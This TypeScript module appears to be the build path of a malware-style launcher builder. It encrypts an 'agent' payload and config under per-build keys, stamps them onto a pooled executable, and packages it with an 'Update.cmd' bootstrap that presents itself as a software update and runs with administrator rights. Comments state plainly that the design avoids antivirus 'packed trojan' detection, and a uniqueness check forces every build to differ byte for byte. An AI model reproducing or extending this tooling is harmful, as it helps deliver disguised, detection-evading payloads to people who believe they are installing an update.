/**
 * launcher-build.ts — WP4 launcher-mode build path.
 *
 * Mirrors generator/launcher/dev/make-stamp.mjs byte-for-byte: takes one warm
 * launcher from the pool, seals a fresh per-build envelope
 * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
 * the cached payload and builds the URL-query config under K_B, appends
 * [hdr][env][cfg][pay][trailer] to the pooled exe, writes a portable Update.cmd
 * bootstrap ("start \"\" \"%~dp0Launcher.exe\"", resolves from any extract
 * folder) beside it, zips the triple { Update.cmd, Launcher.exe, agent.bin }
 * into the job dir, then runs the WP6 validation report card (server-side
 * checks). Nothing is downloaded or fetched at build time; the payload
 * plaintext lives only in memory.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import * as storage from "./storage";
import * as payloadCache from "./payload-cache";
import * as launcherPool from "./launcher-pool";
import { createZip } from "./zip-archive";
import { validateLauncherBuild } from "./launcher-validate";
import { HDR_LEN, ENV_LEN, assembleOverlay, buildAgentBin } from "./launcher-overlay";

export { HDR_LEN, ENV_LEN };

export interface LauncherBuildInputs {
  apiUrl: string;
  clientId: number;
  siteId: number;
  agentType: "workstation" | "server";
  authToken: string;
  features: string[];
  /** Enrollment command carried INSIDE the encrypted config (runbook reference). */
  enroll: string;
  /** Windows staging directory for the decoded payload. */
  outDir: string;
  /** Emit LAUNCHER-STAGE-OK after staging (observability; silent when false). */
  debug: boolean;
}

export interface LauncherRunOutput {
  zip: Buffer;
  stampedExe: Buffer;
  cmd: Buffer; // portable Update.cmd bootstrap
  tag: string;
  launcherSha256: string;
  cmdSha256: string;
  overlay: Buffer;
  configText: string;
}

// Per-build diversity tracking: a build whose stamped launcher or Update.cmd
// byte-matches the previous build's (astronomically unlikely) is rejected.
let lastLauncherSha256: string | null = null;
let lastCmdSha256: string | null = null;

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

/** URL-query config wire format (values percent-encoded, mirrored in CfgGet). */
export function buildConfigString(c: LauncherBuildInputs): string {
  const enc = (s: string) => encodeURIComponent(s);
  return [
    `apiUrl=${enc(c.apiUrl)}`,
    `clientId=${enc(String(c.clientId))}`,
    `siteId=${enc(String(c.siteId))}`,
    `agentType=${enc(c.agentType)}`,
    `authToken=${enc(c.authToken)}`,
    `features=${enc(c.features.join(","))}`,
    `enroll=${enc(c.enroll)}`,
    `outDir=${enc(c.outDir)}`,
    `debug=${c.debug ? "1" : "0"}`,
  ].join("&");
}

/**
 * Run the launcher-mode build end-to-end for a job. The zip is written to
 * storage.zipOutputPath(jobId) and validated; on any failure it throws (the
 * caller cleans up the job dir).
 */
export async function runLauncherBuild(opts: {
  jobId: string;
  inputs: LauncherBuildInputs;
}): Promise<LauncherRunOutput> {
  const { jobId, inputs } = opts;

  // 1. warm launcher (compile-on-demand only when the pool is empty).
  const entry = await launcherPool.take();

  // 2. payload plaintext in memory ONLY (decrypts the cached blob, never
  //    persisted), then re-key under a fresh per-build K_B/IV_PAY.
  const plain = payloadCache.getPayloadBytes();
  const kb = crypto.randomBytes(32);
  const ivPay = crypto.randomBytes(16);
  const ivCfg = crypto.randomBytes(16);
  const payCipher = payloadCache.reKey(plain, kb, ivPay);

  // 3. config string + cipher (K_B/IV_CFG).
  const configText = buildConfigString(inputs);

  // 4. assemble the (EXTERNAL-payload) overlay + write the sibling agent.bin.
  //    Option A (AV): the payload ciphertext is NOT appended to Launcher.exe,
  //    so the PE stays a small low-entropy binary (no "tiny exe + 12 MB random
  //    blob = packed trojan" ML signature). Launcher reads agent.bin at runtime.
  const sealKey = Buffer.from(entry.sealKeyHex, "hex");
  const sealIv = Buffer.from(entry.sealIvHex, "hex");
  const overlay = assembleOverlay({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const agentBin = buildAgentBin({
    sealKey,
    sealIv,
    kb,
    ivPay,
    ivCfg,
    configText,
    payload: plain,
    payloadCipher: payCipher,
    flags: 0,
    externalPayload: true,
  });
  const stampedExe = Buffer.concat([entry.exe, overlay]);
  if (!launcherPool.peIsGui(stampedExe)) {
    throw new Error(
      "stamped launcher is not a GUI-subsystem PE — build aborted"
    );
  }
  const launcherPath = storage.launcherOutputPath(jobId);
  const cmdPath = storage.cmdBootstrapOutputPath(jobId);
  const agentBinPath = storage.agentBinOutputPath(jobId);
  fs.writeFileSync(launcherPath, stampedExe);
  fs.writeFileSync(agentBinPath, agentBin);

  // 5. Portable Update.cmd bootstrap — FIX 1. A bare relative .lnk does NOT
  //    resolve on this host (Explorer double-click -> "No application is
  //    associated"; WScript read an empty target), so the shipped entry is a
  //    real .cmd that locates Launcher.exe via %~dp0 (its own folder) from any
  //    extract folder (Downloads/Desktop/anywhere). Launcher.exe carries
  //    requireAdministrator -> still raises UAC. A per-build `rem` nonce keeps
  //    the file byte-unique per build (diversity guard), like the old .lnk tag.
  const tagPart = entry.tag.slice(0, 8);
  const updateCmd = Buffer.from(
    [
      "@echo off",
      `rem Vantra Update bootstrap -- build ${tagPart}`,
      `start "" "%~dp0Launcher.exe"`,
      "",
    ].join("\r\n"),
    "utf8"
  );
  fs.writeFileSync(cmdPath, updateCmd);

  // 6. zip { Update.cmd, Launcher.exe, agent.bin } (temp files stay until validation).
  const zip = createZip([
    { name: "Update.cmd", data: updateCmd },
    { name: "Launcher.exe", data: stampedExe },
    { name: "agent.bin", data: agentBin },
  ]);
  const zipPath = storage.zipOutputPath(jobId);
  fs.writeFileSync(zipPath, zip);

  // 7. WP6 validation report card (server-side checks).
  const lzHash = sha256Hex(stampedExe);
  const cmdHash = sha256Hex(updateCmd);
  const validation = await validateLauncherBuild({
    cmdPath,
    launcherPath,
    zipPath,
    authToken: inputs.authToken,
    payloadPlain: plain,
    sealKey,
    sealIv,
    agentBin,
    prevLauncherHash: lastLauncherSha256,
    prevCmdHash: lastCmdSha256,
  });
  for (const row of validation.rows) console.log(`  [validate] ${row}`);
  if (!validation.ok) {
    throw new Error("Launcher build failed validation — job aborted");
  }
  // Task D: the zip is kept until expiry; drop the temp Update.cmd + Launcher.exe.
  storage.removeLauncherTemp(jobId);
  lastLauncherSha256 = lzHash;
  lastCmdSha256 = cmdHash;

  console.log(
    `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
      `overlay=${overlay.length}B cfg=${configText.length}B zip=${zip.length}B ` +
      `tag=${entry.tag.slice(0, 8)}`
  );

  return {
    zip,
    stampedExe,
    cmd: updateCmd,
    tag: entry.tag,
    launcherSha256: lzHash,
    cmdSha256: cmdHash,
    overlay,
    configText,
  };
}